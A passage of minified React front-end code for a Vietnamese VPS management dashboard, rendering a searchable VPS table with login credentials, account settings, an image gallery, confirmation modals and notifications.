                                label: "Danh Sách VPS"
                            }, {
                                id: "profile",
                                icon: fi,
                                label: "Tài Khoản"
                            }, {
                                id: "images",
                                icon: hu,
                                label: "Hình Ảnh"
                            }].map(L => l.jsxs("button", {
                                onClick: () => t(L.id),
                                className: `group relative inline-flex items-center rounded-xl px-6 py-2.5 text-sm font-medium transition-all duration-300 ${e === L.id ? "bg-white/30 text-white shadow-lg" : "text-white/70 hover:bg-white/10 hover:text-white"}`,
                                children: [l.jsx(ue, {
                                    icon: L.icon,
                                    className: `mr-2 transition-transform duration-300 ${e === L.id ? "scale-110" : "group-hover:scale-110"}`
                                }), L.label]
                            }, L.id))
                        }), l.jsx("button", {
                            onClick: _e,
                            className: "group relative hidden h-10 items-center overflow-hidden rounded-xl border border-white/10 bg-white/10 px-6 backdrop-blur-sm transition-all duration-200 hover:bg-white/20 sm:inline-flex",
                            children: l.jsxs("span", {
                                className: "relative flex items-center text-sm font-medium text-white",
                                children: [l.jsx(ue, {
                                    icon: Gs,
                                    className: "mr-2 transition-transform duration-200 group-hover:-translate-x-0.5"
                                }), l.jsx("span", {
                                    className: "transition-transform duration-200 group-hover:-translate-x-0.5",
                                    children: "Đăng Xuất"
                                })]
                            })
                        })]
                    })
                })
            }), Ue && l.jsxs("div", {
                className: "fixed inset-0 z-[100] overflow-hidden",
                children: [l.jsx("div", {
                    className: "absolute inset-0 bg-purple-900/30 backdrop-blur-md",
                    onClick: () => Ce(!1)
                }), l.jsx("div", {
                    className: `absolute inset-y-0 left-0 w-72 transform transition-transform duration-300 ease-in-out ${Ue ? "translate-x-0" : "-translate-x-full"}`,
                    children: l.jsxs("div", {
                        className: "flex h-full flex-col overflow-y-auto bg-gradient-to-br from-indigo-600 via-purple-600 to-pink-500 p-6 shadow-2xl",
                        children: [l.jsxs("div", {
                            className: "flex items-center justify-between",
                            children: [l.jsx("span", {
                                className: "bg-gradient-to-r from-white to-white/80 bg-clip-text text-lg font-bold text-transparent",
                                children: "Menu"
                            }), l.jsx("button", {
                                onClick: () => Ce(!1),
                                className: "rounded-xl bg-white/10 p-2 text-white backdrop-blur-sm transition-all duration-200 hover:bg-white/20",
                                children: l.jsx(ue, {
                                    icon: Xr,
                                    className: "h-6 w-6"
                                })
                            })]
                        }), l.jsx("div", {
                            className: "mt-8 flex flex-col space-y-2",
                            children: [{
                                id: "vps",
                                icon: pu,
                                label: "Danh Sách VPS"
                            }, {
                                id: "profile",
                                icon: fi,
                                label: "Tài Khoản"
                            }, {
                                id: "images",
                                icon: hu,
                                label: "Hình Ảnh"
                            }].map(L => l.jsxs("button", {
                                onClick: () => {
                                    t(L.id),
                                    Ce(!1)
                                }
                                ,
                                className: `flex items-center rounded-xl px-4 py-3 text-sm font-medium transition-all duration-200 ${e === L.id ? "bg-white/20 text-white shadow-lg" : "text-white/70 hover:bg-white/10 hover:text-white"}`,
                                children: [l.jsx(ue, {
                                    icon: L.icon,
                                    className: `mr-3 transition-transform duration-200 ${e === L.id ? "scale-110" : ""}`
                                }), L.label, e === L.id && l.jsx("div", {
                                    className: "ml-auto h-2 w-2 rounded-full bg-white"
                                })]
                            }, L.id))
                        }), l.jsxs("div", {
                            className: "mt-auto pt-6",
                            children: [l.jsx("div", {
                                className: "mb-4 h-px bg-gradient-to-r from-transparent via-white/20 to-transparent"
                            }), l.jsxs("button", {
                                onClick: _e,
                                className: "flex w-full items-center rounded-xl bg-white/10 px-4 py-3 text-sm font-medium text-white/70 transition-all duration-200 hover:bg-white/20 hover:text-white",
                                children: [l.jsx(ue, {
                                    icon: Gs,
                                    className: "mr-3"
                                }), "Đăng Xuất"]
                            })]
                        })]
                    })
                })]
            }), l.jsx("main", {
                className: "relative z-10 p-4 sm:p-6 lg:p-8",
                children: l.jsx("div", {
                    className: "mx-auto max-w-7xl",
                    children: l.jsx("div", {
                        className: "overflow-hidden rounded-3xl bg-white/10 p-1 backdrop-blur-lg",
                        children: l.jsxs("div", {
                            className: "relative rounded-2xl bg-white p-4 shadow-2xl sm:p-8",
                            children: [e === "vps" && l.jsx("div", {
                                className: "flex flex-col space-y-6",
                                children: l.jsxs("div", {
                                    className: "flex flex-col space-y-4",
                                    children: [l.jsxs("div", {
                                        className: "flex flex-col gap-4 lg:flex-row",
                                        children: [l.jsxs("div", {
                                            className: "relative flex-1",
                                            children: [l.jsx(ue, {
                                                icon: ms,
                                                className: "absolute left-3 top-1/2 -translate-y-1/2 text-purple-400"
                                            }), l.jsx("input", {
                                                type: "text",
                                                value: k,
                                                onChange: L => w(L.target.value),
                                                placeholder: "Tìm kiếm VPS... (Tên VPS, Tên Đăng Nhập, IP)",
                                                className: "w-full rounded-xl border border-purple-200 bg-purple-50/50 py-3.5 pl-10 pr-4 text-sm text-purple-900 transition-all duration-200 ease-in-out placeholder:text-purple-400 focus:border-purple-500 focus:bg-white focus:outline-none focus:ring-2 focus:ring-purple-200"
                                            })]
                                        }), l.jsxs("form", {
                                            onSubmit: L => {
                                                L.preventDefault(),
                                                ae()
                                            }
                                            ,
                                            className: "flex flex-1 flex-col gap-4 lg:flex-row",
                                            children: [l.jsx("input", {
                                                ref: C,
                                                type: "text",
                                                value: a,
                                                onChange: L => o(L.target.value),
                                                placeholder: "Tên VPS",
                                                className: "flex-1 rounded-xl border border-purple-200 bg-purple-50/50 px-4 py-3.5 text-sm text-purple-900 transition-all duration-200 ease-in-out placeholder:text-purple-400 focus:border-purple-500 focus:bg-white focus:outline-none focus:ring-2 focus:ring-purple-200"
                                            }), l.jsxs("button", {
                                                type: "submit",
                                                disabled: Se >= 10,
                                                className: `whitespace-nowrap rounded-xl bg-gradient-to-r from-purple-600 to-pink-500 px-6 py-3.5 text-sm font-medium text-white transition-all duration-200 hover:shadow-lg hover:shadow-purple-500/20 focus:outline-none focus:ring-2 focus:ring-purple-400 focus:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 ${Se >= 1 ? "" : "hover:translate-y-[-1px]"}`,
                                                children: [l.jsx(ue, {
                                                    icon: Wg,
                                                    className: "mr-2"
                                                }), "Khởi Tạo VPS", " ", Se + 1]
                                            })]
                                        })]
                                    }), l.jsx("div", {
                                        className: "rounded-xl border border-purple-100 bg-white shadow-sm",
                                        children: n.length === 0 ? l.jsxs("div", {
                                            className: "flex flex-col items-center justify-center py-16",
                                            children: [l.jsxs("div", {
                                                className: "relative mb-8 h-32 w-32",
                                                children: [l.jsx("div", {
                                                    className: "absolute inset-0 animate-float rounded-full bg-gradient-to-r from-purple-400 to-pink-400 opacity-20 blur-xl"
                                                }), l.jsx("div", {
                                                    className: "relative flex h-full w-full items-center justify-center rounded-full bg-white shadow-xl",
                                                    children: l.jsx(ue, {
                                                        icon: pu,
                                                        className: "text-4xl text-pink-500"
                                                    })
                                                })]
                                            }), l.jsx("h3", {
                                                className: "mb-2 text-xl font-semibold text-purple-900",
                                                children: "Chưa có VPS nào được khởi tạo"
                                            }), l.jsxs("p", {
                                                className: "mb-8 text-center text-purple-500",
                                                children: ["Bắt đầu bằng cách thêm VPS đầu tiên của bạn.", l.jsx("br", {}), 'Nhấn nút "Khởi Tạo VPS" ở trên để bắt đầu.']
                                            })]
                                        }) : l.jsx("div", {
                                            className: "overflow-x-auto",
                                            children: l.jsxs("table", {
                                                className: "min-w-full divide-y divide-purple-200",
                                                children: [l.jsx("thead", {
                                                    className: "bg-gradient-to-r from-purple-50 to-pink-50",
                                                    children: l.jsx("tr", {
                                                        children: [{
                                                            id: "stt",
                                                            label: "STT"
                                                        }, {
                                                            id: "name",
                                                            label: "Tên"
                                                        }, {
                                                            id: "username",
                                                            label: "Tên Đăng Nhập"
                                                        }, {
                                                            id: "password",
                                                            label: "Mật Khẩu"
                                                        }, {
                                                            id: "ip",
                                                            label: "IP"
                                                        }, {
                                                            id: "actions",
                                                            label: "Thao Tác"
                                                        }].map(L => l.jsx("th", {
                                                            onClick: () => {
                                                                ["name", "username", "stt", "ip"].includes(L.id) && de(L.id)
                                                            }
                                                            ,
                                                            className: `px-6 py-4 text-left text-xs font-medium uppercase tracking-wider text-purple-500 ${["name", "username", "stt", "ip"].includes(L.id) ? "cursor-pointer hover:text-purple-700" : ""}`,
                                                            children: l.jsxs("div", {
                                                                className: "flex items-center",
                                                                children: [L.label, A === L.id && l.jsx(ue, {
                                                                    icon: K === "asc" ? $b : Rb,
                                                                    className: "ml-2"
                                                                })]
                                                            })
                                                        }, L.id))
                                                    })
                                                }), l.jsx("tbody", {
                                                    className: "divide-y divide-purple-100",
                                                    children: Xe(O(n)).length === 0 ? l.jsx("tr", {
                                                        children: l.jsx("td", {
                                                            colSpan: 6,
                                                            children: l.jsxs("div", {
                                                                className: "flex flex-col items-center justify-center py-16",
                                                                children: [l.jsxs("div", {
                                                                    className: "relative mb-8 h-32 w-32",
                                                                    children: [l.jsx("div", {
                                                                        className: "absolute inset-0 animate-float rounded-full bg-gradient-to-r from-purple-400 to-pink-400 opacity-20 blur-xl"
                                                                    }), l.jsx("div", {
                                                                        className: "relative flex h-full w-full items-center justify-center rounded-full bg-white shadow-xl",
                                                                        children: l.jsx(ue, {
                                                                            icon: ms,
                                                                            className: "text-4xl text-pink-500"
                                                                        })
                                                                    })]
                                                                }), l.jsx("h3", {
                                                                    className: "mb-2 text-xl font-semibold text-purple-900",
                                                                    children: "Không tìm thấy kết quả"
                                                                }), l.jsxs("p", {
                                                                    className: "text-center text-purple-500",
                                                                    children: ["Không tìm thy VPS nào khớp với từ khóa tìm kiếm.", l.jsx("br", {}), "Vui lòng ử lại với từ khóa khác."]
                                                                })]
                                                            })
                                                        })
                                                    }) : Xe(O(n)).map(L => l.jsxs("tr", {
                                                        className: "group transition-colors duration-150 hover:bg-purple-50/50",
                                                        children: [l.jsx("td", {
                                                            className: "whitespace-nowrap px-6 py-4 text-sm font-semibold text-purple-900",
                                                            children: L.name
                                                        }), l.jsx("td", {
                                                            className: "whitespace-nowrap px-6 py-4 text-sm text-purple-700",
                                                            children: L.name
                                                        }), l.jsx("td", {
                                                            className: "whitespace-nowrap px-6 py-4 text-sm text-purple-700",
                                                            children: L.username
                                                        }), l.jsx("td", {
                                                            className: "whitespace-nowrap px-6 py-4 text-sm text-purple-700",
                                                            children: L.password
                                                        }), l.jsx("td", {
                                                            className: "whitespace-nowrap px-6 py-4 text-sm text-purple-700",
                                                            children: L.ip
                                                        }), l.jsxs("td", {
                                                            className: "whitespace-nowrap px-6 py-4",
                                                            children: [l.jsxs("div", {
                                                                className: "flex space-x-2 sm:hidden",
                                                                children: [l.jsx("button", {
                                                                    onClick: () => Oe(L),
                                                                    className: "flex h-8 w-8 items-center justify-center rounded-lg bg-purple-50 text-purple-600 transition-colors hover:bg-purple-100",
                                                                    title: "Chỉnh sửa",
                                                                    children: l.jsx(ue, {
                                                                        icon: oh,
                                                                        className: "h-4 w-4"
                                                                    })
                                                                }), l.jsx("button", {
                                                                    onClick: () => Ke(L.name),
                                                                    className: "flex h-8 w-8 items-center justify-center rounded-lg bg-purple-50 text-purple-600 transition-colors hover:bg-purple-100",
                                                                    title: "Xóa",
                                                                    children: l.jsx(ue, {
                                                                        icon: Co,
                                                                        className: "h-4 w-4"
                                                                    })
                                                                })]
                                                            }), l.jsxs("div", {
                                                                className: "hidden space-x-3 sm:flex",
                                                                children: [l.jsx("button", {
                                                                    onClick: () => Oe(L),
                                                                    className: "rounded-lg p-2 text-purple-600 opacity-0 transition-all duration-200 hover:bg-purple-100 group-hover:opacity-100",
                                                                    title: "Chỉnh sửa",
                                                                    children: l.jsx(ue, {
                                                                        icon: oh
                                                                    })
                                                                }), l.jsx("button", {
                                                                    onClick: () => Ke(L.name),
                                                                    className: "rounded-lg p-2 text-purple-600 opacity-0 transition-all duration-200 hover:bg-purple-100 group-hover:opacity-100",
                                                                    title: "Xóa",
                                                                    children: l.jsx(ue, {
                                                                        icon: Co
                                                                    })
                                                                })]
                                                            })]
                                                        })]
                                                    }, L.name))
                                                })]
                                            })
                                        })
                                    })]
                                })
                            }), e === "profile" && l.jsxs("div", {
                                className: "flex flex-col space-y-6",
                                children: [l.jsx("h2", {
                                    className: "text-xl font-semibold text-purple-900",
                                    children: "Thay Đổi Thông Tin Tài Khoản"
                                }), l.jsxs("div", {
                                    className: "space-y-4",
                                    children: [l.jsxs("div", {
                                        className: "group relative",
                                        children: [l.jsx("label", {
                                            className: "mb-1 block text-sm font-medium text-purple-700",
                                            children: "Tên Đăng Nhập"
                                        }), l.jsx("input", {
                                            type: "text",
                                            value: i,
                                            onChange: L => s(L.target.value),
                                            className: "w-full rounded-xl border border-purple-200 bg-purple-50/50 px-4 py-3.5 text-sm text-purple-900 transition-all duration-200 ease-in-out placeholder:text-purple-400 focus:border-purple-500 focus:bg-white focus:outline-none focus:ring-2 focus:ring-purple-200"
                                        })]
                                    }), l.jsxs("div", {
                                        className: "group relative",
                                        children: [l.jsx("label", {
                                            className: "mb-1 block text-sm font-medium text-purple-700",
                                            children: "Mật Khẩu"
                                        }), l.jsxs("div", {
                                            className: "relative",
                                            children: [l.jsx("input", {
                                                type: Ae ? "text" : "password",
                                                value: u,
                                                onChange: L => c(L.target.value),
                                                className: "w-full rounded-xl border border-purple-200 bg-purple-50/50 px-4 py-3.5 pr-12 text-sm text-purple-900 transition-all duration-200 ease-in-out placeholder:text-purple-400 focus:border-purple-500 focus:bg-white focus:outline-none focus:ring-2 focus:ring-purple-200"
                                            }), l.jsx("button", {
                                                type: "button",
                                                onClick: () => H(!Ae),
                                                className: "absolute right-3 top-1/2 -translate-y-1/2 text-purple-400 hover:text-purple-600",
                                                children: l.jsx(ue, {
                                                    icon: Ae ? Ys : Xs
                                                })
                                            })]
                                        })]
                                    }), l.jsx("button", {
                                        onClick: be,
                                        className: "group relative w-full overflow-hidden rounded-xl bg-gradient-to-r from-purple-600 to-pink-500 p-[2px] focus:outline-none focus:ring-2 focus:ring-purple-400 focus:ring-offset-2 sm:w-auto",
                                        children: l.jsx("span", {
                                            className: "relative block rounded-[10px] bg-gradient-to-r from-purple-600 to-pink-500 px-6 py-3 text-sm font-semibold text-white transition-all duration-200 ease-in-out group-hover:bg-none",
                                            children: "Lưu Thay Đổi"
                                        })
                                    })]
                                })]
                            }), e === "images" && l.jsxs("div", {
                                className: "space-y-6",
                                children: [l.jsxs("div", {
                                    className: "flex flex-col space-y-4 sm:flex-row sm:items-center sm:justify-between",
                                    children: [l.jsx("h2", {
                                        className: "text-xl font-semibold text-purple-900",
                                        children: "Quản Lý Hình Ảnh"
                                    }), l.jsxs("div", {
                                        className: "flex flex-col gap-2 sm:flex-row sm:gap-4",
                                        children: [l.jsx("button", {
                                            onClick: St,
                                            className: "group relative overflow-hidden rounded-xl bg-gradient-to-r from-purple-600 to-pink-500 p-[2px] focus:outline-none focus:ring-2 focus:ring-purple-400 focus:ring-offset-2",
                                            children: l.jsxs("span", {
                                                className: "relative block rounded-[10px] bg-gradient-to-r from-purple-600 to-pink-500 px-4 py-2 text-sm font-semibold text-white transition-all duration-200 ease-in-out group-hover:bg-none",
                                                children: [l.jsx(ue, {
                                                    icon: Ji,
                                                    className: "mr-2"
                                                }), `Tải xuống ${Lt()} hình ảnh`]
                                            })
                                        }), l.jsx("button", {
                                            onClick: mn,
                                            className: "group relative overflow-hidden rounded-xl bg-gradient-to-r from-purple-600 to-pink-500 p-[2px] focus:outline-none focus:ring-2 focus:ring-purple-400 focus:ring-offset-2",
                                            children: l.jsxs("span", {
                                                className: "relative block rounded-[10px] bg-gradient-to-r from-purple-600 to-pink-500 px-4 py-2 text-sm font-semibold text-white transition-all duration-200 ease-in-out group-hover:bg-none",
                                                children: [l.jsx(ue, {
                                                    icon: Co,
                                                    className: "mr-2"
                                                }), `Xóa ${Lt()} hình ảnh`]
                                            })
                                        })]
                                    })]
                                }), l.jsxs("div", {
                                    className: "space-y-4",
                                    children: [l.jsxs("div", {
                                        className: "relative",
                                        children: [l.jsx(ue, {
                                            icon: ms,
                                            className: "absolute left-3 top-1/2 -translate-y-1/2 text-purple-400"
                                        }), l.jsx("input", {
                                            type: "text",
                                            value: le,
                                            onChange: L => z(L.target.value),
                                            placeholder: "Tìm kiếm hình ảnh...",
                                            className: "w-full rounded-xl border border-purple-200 bg-purple-50/50 py-3.5 pl-10 pr-4 text-sm text-purple-900 transition-all duration-200 ease-in-out placeholder:text-purple-400 focus:border-purple-500 focus:bg-white focus:outline-none focus:ring-2 focus:ring-purple-200"
                                        })]
                                    }), l.jsx("div", {
                                        className: "flex items-center",
                                        children: l.jsx(Ah, {
                                            checked: Ne,
                                            onChange: Pt,
                                            selectAll: !0
                                        })
                                    })]
                                }), l.jsx("div", {
                                    className: "grid grid-cols-1 gap-4 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4",
                                    children: Q.filter(L => L.filename.toLowerCase().includes(le.toLowerCase())).slice((M - 1) * ge, M * ge).map(L => l.jsx("div", {
                                        className: "group relative overflow-hidden rounded-xl bg-gradient-to-r from-purple-600 to-pink-500 p-[2px] transition-all duration-300 hover:shadow-lg hover:shadow-purple-500/20",
                                        children: l.jsxs("div", {
                                            className: "relative flex h-full flex-col rounded-[10px] bg-white",
                                            children: [l.jsx("div", {
                                                className: "absolute right-3 top-3 z-20",
                                                children: l.jsx("div", {
                                                    className: "relative",
                                                    onClick: ne => ne.stopPropagation(),
                                                    children: l.jsx(Ah, {
                                                        checked: xe[L.filename] || !1,
                                                        onChange: () => ut(L.filename),
                                                        selectAll: !1
                                                    })
                                                })
                                            }), l.jsxs("div", {
                                                onClick: () => at(L),
                                                className: "group relative aspect-square cursor-pointer overflow-hidden rounded-t-[10px]",
                                                children: [l.jsx("div", {
                                                    className: "absolute inset-0 flex items-center justify-center bg-gray-100",
                                                    children: l.jsx("div", {
                                                        className: "h-full w-full",
                                                        children: l.jsx("img", {
                                                            src: L.url + "?token=" + y,
                                                            alt: L.filename,
                                                            className: "h-full w-full object-cover transition-transform duration-300 group-hover:scale-110"
                                                        })
                                                    })
                                                }), l.jsxs("div", {
                                                    className: "absolute bottom-3 right-3 z-10 flex gap-2 sm:hidden",
                                                    children: [l.jsx("button", {
                                                        onClick: ne => {
                                                            ne.stopPropagation(),
                                                            De(L.filename)
                                                        }
                                                        ,
                                                        className: "flex h-9 w-9 items-center justify-center rounded-full bg-black/50 text-white backdrop-blur-sm transition-transform active:scale-95",
                                                        title: "Tải xuống",
                                                        children: l.jsx(ue, {
                                                            icon: Ji,
                                                            className: "h-4 w-4"
                                                        })
                                                    }), l.jsx("button", {
                                                        onClick: ne => {
                                                            ne.stopPropagation(),
                                                            ee(L.filename)
                                                        }
                                                        ,
                                                        className: "flex h-9 w-9 items-center justify-center rounded-full bg-black/50 text-white backdrop-blur-sm transition-transform active:scale-95",
                                                        title: "Xóa",
                                                        children: l.jsx(ue, {
                                                            icon: Co,
                                                            className: "h-4 w-4"
                                                        })
                                                    })]
                                                }), l.jsxs("div", {
                                                    className: "absolute inset-0 hidden items-center justify-center gap-4 bg-black bg-opacity-50 opacity-0 transition-opacity duration-300 group-hover:opacity-100 sm:flex",
                                                    children: [l.jsx("button", {
                                                        onClick: ne => {
                                                            ne.stopPropagation(),
                                                            De(L.filename)
                                                        }
                                                        ,
                                                        className: "flex h-10 w-10 items-center justify-center rounded-full bg-white/10 text-white backdrop-blur-sm transition-colors hover:bg-white/20",
                                                        title: "Tải xuống",
                                                        children: l.jsx(ue, {
                                                            icon: Ji
                                                        })
                                                    }), l.jsx("button", {
                                                        onClick: ne => {
                                                            ne.stopPropagation(),
                                                            ee(L.filename)
                                                        }
                                                        ,
                                                        className: "flex h-10 w-10 items-center justify-center rounded-full bg-white/10 text-white backdrop-blur-sm transition-colors hover:bg-white/20",
                                                        title: "Xóa",
                                                        children: l.jsx(ue, {
                                                            icon: Co
                                                        })
                                                    })]
                                                })]
                                            }), l.jsxs("div", {
                                                className: "flex flex-col space-y-1 p-4",
                                                children: [l.jsx("p", {
                                                    className: "truncate text-sm font-medium text-purple-900",
                                                    title: L.filename,
                                                    children: L.filename
                                                }), l.jsxs("p", {
                                                    className: "text-xs text-purple-500",
                                                    title: L.created,
                                                    children: ["Ngày tạo:", " ", L.created]
                                                })]
                                            })]
                                        })
                                    }, L.filename))
                                }), Q.length === 0 && l.jsxs("div", {
                                    className: "flex flex-col items-center justify-center py-12",
                                    children: [l.jsx(ue, {
                                        icon: hu,
                                        className: "mb-4 text-4xl text-pink-500"
                                    }), l.jsx("p", {
                                        className: "text-lg text-purple-600",
                                        children: "Chưa có hình ảnh nào"
                                    })]
                                }), Math.ceil(Q.length / ge) > 1 && l.jsx("div", {
                                    className: "mt-6 flex flex-wrap justify-center gap-2",
                                    children: Array.from({
                                        length: Math.ceil(Q.length / ge)
                                    }).map( (L, ne) => l.jsx("button", {
                                        onClick: () => Y(ne + 1),
                                        className: `min-w-[2.5rem] rounded-xl px-3 py-2 text-sm font-medium transition-all duration-200 ${M === ne + 1 ? "bg-gradient-to-r from-purple-600 to-pink-500 text-white" : "text-purple-600 hover:bg-purple-50"}`,
                                        children: ne + 1
                                    }, `page-${ne + 1}`))
                                })]
                            })]
                        })
                    })
                })
            })]
        }), f && l.jsxs("div", {
            className: "fixed inset-0 z-[200] flex items-center justify-center p-4",
            children: [l.jsx("div", {
                className: "absolute inset-0 bg-purple-900/30 backdrop-blur-md",
                onClick: () => d(null)
            }), l.jsx("div", {
                className: "relative w-full max-w-md animate-fade-in",
                children: l.jsx("div", {
                    className: "overflow-hidden rounded-3xl bg-white/10 p-1 backdrop-blur-lg",
                    children: l.jsxs("div", {
                        className: "relative rounded-2xl bg-white p-8 shadow-2xl",
                        children: [l.jsx("div", {
                            className: "absolute -right-6 -top-6 h-24 w-24 rounded-full bg-gradient-to-br from-purple-600 to-pink-500 opacity-20 blur-lg"
                        }), l.jsx("div", {
                            className: "absolute -left-6 -top-6 h-24 w-24 rounded-full bg-gradient-to-br from-blue-600 to-purple-500 opacity-20 blur-lg"
                        }), l.jsxs("h3", {
                            className: "mb-6 text-xl font-semibold text-purple-900",
                            children: ["VPS - ", f.name]
                        }), h ? l.jsx("div", {
                            className: "flex justify-center py-8",
                            children: l.jsx("div", {
                                className: "h-8 w-8 animate-spin rounded-full border-b-2 border-purple-600"
                            })
                        }) : l.jsxs("div", {
                            className: "space-y-4",
                            children: [l.jsxs("div", {
                                children: [l.jsx("label", {
                                    className: "mb-1 block text-sm font-medium text-purple-700",
                                    children: "Tên Đăng Nhập"
                                }), l.jsx("input", {
                                    type: "text",
                                    value: f.username,
                                    onChange: L => d({
                                        ...f,
                                        username: L.target.value
                                    }),
                                    className: "w-full rounded-xl border border-purple-200 bg-purple-50/50 px-4 py-3.5 text-sm text-purple-900 transition-all duration-200 ease-in-out placeholder:text-purple-400 focus:border-purple-500 focus:bg-white focus:outline-none focus:ring-2 focus:ring-purple-200"
                                })]
                            }), l.jsxs("div", {
                                className: "relative",
                                children: [l.jsx("label", {
                                    className: "mb-1 block text-sm font-medium text-purple-700",
                                    children: "Mật Khẩu"
                                }), l.jsxs("div", {
                                    className: "relative",
                                    children: [l.jsx("input", {
                                        type: X ? "text" : "password",
                                        value: f.password,
                                        onChange: L => d({
                                            ...f,
                                            password: L.target.value
                                        }),
                                        className: "w-full rounded-xl border border-purple-200 bg-purple-50/50 px-4 py-3.5 pr-12 text-sm text-purple-900 transition-all duration-200 ease-in-out placeholder:text-purple-400 focus:border-purple-500 focus:bg-white focus:outline-none focus:ring-2 focus:ring-purple-200"
                                    }), l.jsx("button", {
                                        type: "button",
                                        onClick: () => J(!X),
                                        className: "absolute right-3 top-1/2 -translate-y-1/2 text-purple-400 hover:text-purple-600",
                                        children: l.jsx(ue, {
                                            icon: X ? Ys : Xs
                                        })
                                    })]
                                })]
                            }), l.jsxs("div", {
                                className: "flex flex-col gap-2 pt-4 sm:flex-row sm:justify-end sm:space-x-4",
                                children: [l.jsx("button", {
                                    onClick: () => d(null),
                                    className: "w-full rounded-xl border-2 border-purple-200 px-6 py-3 text-sm font-medium text-purple-700 transition-colors hover:border-purple-300 hover:bg-purple-50 sm:w-auto",
                                    children: "Hủy"
                                }), l.jsx("button", {
                                    onClick: () => je(f.name, f.username, f.password),
                                    className: "group relative w-full overflow-hidden rounded-xl bg-gradient-to-r from-purple-600 to-pink-500 p-[2px] focus:outline-none focus:ring-2 focus:ring-purple-400 focus:ring-offset-2 sm:w-auto",
                                    children: l.jsx("span", {
                                        className: "relative block rounded-[10px] bg-gradient-to-r from-purple-600 to-pink-500 px-6 py-3 text-sm font-semibold text-white transition-all duration-200 ease-in-out group-hover:bg-none",
                                        children: "Lưu"
                                    })
                                })]
                            })]
                        })]
                    })
                })
            })]
        }), x.isOpen && l.jsxs("div", {
            className: "fixed inset-0 z-[200] flex items-center justify-center p-4",
            children: [l.jsx("div", {
                className: "absolute inset-0 bg-purple-900/30 backdrop-blur-md",
                onClick: () => g({
                    isOpen: !1,
                    userName: ""
                })
            }), l.jsx("div", {
                className: "relative w-full max-w-md animate-fade-in",
                children: l.jsx("div", {
                    className: "overflow-hidden rounded-3xl bg-white/10 p-1 backdrop-blur-lg",
                    children: l.jsxs("div", {
                        className: "relative rounded-2xl bg-white p-8 shadow-2xl",
                        children: [l.jsx("div", {
                            className: "absolute -right-6 -top-6 h-24 w-24 rounded-full bg-gradient-to-br from-purple-600 to-pink-500 opacity-20 blur-lg"
                        }), l.jsx("div", {
                            className: "absolute -left-6 -top-6 h-24 w-24 rounded-full bg-gradient-to-br from-blue-600 to-purple-500 opacity-20 blur-lg"
                        }), l.jsx("h3", {
                            className: "mb-4 text-xl font-semibold text-purple-900",
                            children: "Xác nhận xóa"
                        }), l.jsxs("p", {
                            className: "mb-6 text-purple-600",
                            children: ['Bạn có chắc chắn muốn xóa VPS "', x.userName, '"?']
                        }), l.jsxs("div", {
                            className: "flex flex-col gap-2 sm:flex-row sm:justify-end sm:space-x-4",
                            children: [l.jsx("button", {
                                onClick: () => g({
                                    isOpen: !1,
                                    userName: ""
                                }),
                                className: "rounded-xl border-2 border-purple-200 px-6 py-3 text-sm font-medium text-purple-700 transition-colors hover:border-purple-300 hover:bg-purple-50",
                                children: "Hủy"
                            }), l.jsx("button", {
                                onClick: q,
                                className: "group relative overflow-hidden rounded-xl bg-gradient-to-r from-purple-600 to-pink-500 p-[2px] focus:outline-none focus:ring-2 focus:ring-purple-400 focus:ring-offset-2",
                                children: l.jsx("span", {
                                    className: "relative block rounded-[10px] bg-gradient-to-r from-purple-600 to-pink-500 px-6 py-3 text-sm font-semibold text-white transition-all duration-200 ease-in-out group-hover:bg-none",
                                    children: "Xóa"
                                })
                            })]
                        })]
                    })
                })
            })]
        }), W.isOpen && l.jsxs("div", {
            className: "fixed inset-0 z-[200] flex items-center justify-center p-4",
            children: [l.jsx("div", {
                className: "absolute inset-0 bg-purple-900/30 backdrop-blur-md",
                onClick: () => b({
                    isOpen: !1,
                    filename: ""
                })
            }), l.jsx("div", {
                className: "relative w-full max-w-md animate-fade-in",
                children: l.jsx("div", {
                    className: "overflow-hidden rounded-3xl bg-white/10 p-1 backdrop-blur-lg",
                    children: l.jsxs("div", {
                        className: "relative rounded-2xl bg-white p-8 shadow-2xl",
                        children: [l.jsx("div", {
                            className: "absolute -right-6 -top-6 h-24 w-24 rounded-full bg-gradient-to-br from-purple-600 to-pink-500 opacity-20 blur-lg"
                        }), l.jsx("div", {
                            className: "absolute -left-6 -top-6 h-24 w-24 rounded-full bg-gradient-to-br from-blue-600 to-purple-500 opacity-20 blur-lg"
                        }), l.jsx("h3", {
                            className: "mb-4 text-xl font-semibold text-purple-900",
                            children: "Xác nhận xóa"
                        }), l.jsxs("p", {
                            className: "mb-6 text-purple-600",
                            children: ["Bạn có chắc chắn muốn xóa", " ", W.filename.includes(", ") ? "các" : "", " ", 'hình ảnh "', W.filename, '"?']
                        }), l.jsxs("div", {
                            className: "flex flex-col gap-2 sm:flex-row sm:justify-end sm:space-x-4",
                            children: [l.jsx("button", {
                                onClick: () => b({
                                    isOpen: !1,
                                    filename: ""
                                }),
                                className: "rounded-xl border-2 border-purple-200 px-6 py-3 text-sm font-medium text-purple-700 transition-colors hover:border-purple-300 hover:bg-purple-50",
                                children: "Hủy"
                            }), l.jsx("button", {
                                onClick: oe,
                                className: "group relative overflow-hidden rounded-xl bg-gradient-to-r from-purple-600 to-pink-500 p-[2px] focus:outline-none focus:ring-2 focus:ring-purple-400 focus:ring-offset-2",
                                children: l.jsx("span", {
                                    className: "relative block rounded-[10px] bg-gradient-to-r from-purple-600 to-pink-500 px-6 py-3 text-sm font-semibold text-white transition-all duration-200 ease-in-out group-hover:bg-none",
                                    children: "Xóa"
                                })
                            })]
                        })]
                    })
                })
            })]
        }), p.message && l.jsx("div", {
            className: "fixed bottom-4 right-4 z-[300]",
            children: l.jsx("div", {
                className: "animate-slide-up-fade transform-gpu overflow-hidden rounded-xl bg-white/10 p-1 backdrop-blur-lg transition-all duration-500",
                children: l.jsxs("div", {
                    className: "relative overflow-hidden rounded-[10px] bg-white px-4 py-3 pr-12 shadow-lg",
                    children: [l.jsx("div", {
                        className: `absolute inset-0 left-0 top-0 w-1 ${p.type === "success" ? "bg-green-500" : ""} ${p.type === "error" ? "bg-red-500" : ""} ${p.type === "info" ? "bg-blue-500" : ""} `
                    }), l.jsxs("div", {
                        className: "flex items-center gap-3",
                        children: [l.jsx("div", {
                            className: `flex h-8 w-8 flex-shrink-0 items-center justify-center rounded-full ${p.type === "success" ? "bg-green-100 text-green-500" : ""} ${p.type === "error" ? "bg-red-100 text-red-500" : ""} ${p.type === "info" ? "bg-blue-100 text-blue-500" : ""} `,
                            children: l.jsx(ue, {
                                icon: p.type === "success" ? oo : p.type === "error" ? Xr : Ob,
                                className: "h-4 w-4"
